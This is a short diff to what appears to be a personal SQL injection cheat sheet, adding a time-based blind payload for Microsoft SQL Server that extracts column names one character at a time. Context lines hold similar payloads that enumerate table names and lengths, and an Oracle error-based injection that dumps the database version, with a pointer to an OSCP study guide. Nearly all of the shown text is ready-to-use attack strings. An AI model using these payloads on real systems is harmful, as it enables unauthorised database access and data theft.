@@ -79,6 +79,7 @@ Table Length= 'IF(LEN((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'))+>+1)+
 
 Table Name= 'IF(SUBSTRING((SELECT+TOP+1+NAME+FROM+sysobjects+WHERE+xtype='U'),1,1))+>+'a'+WAITFOR+DELAY+'00:00:10'--
 
+Column Name = 'IF(SUBSTRING((SELECT+TOP+1+name+FROM+sys.columns+WHERE+object_id=OBJECT_ID('your_table_name')),1,1))>+'a'+WAITFOR+DELAY+'00:00:10'--
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Oracle sql injection mannually database dump(summet application)--->(refrence https://grav3m1nd-byte.gitbook.io/htb-resources/oscp-study-material/learning-sql-injection-in-oracle-databases)
 '%20AND%201%3dCTXSYS.DRITHSX.SN(user,(select%20banner%20from%20v$version%20where%20rownum%3d1))--sdfdsfds
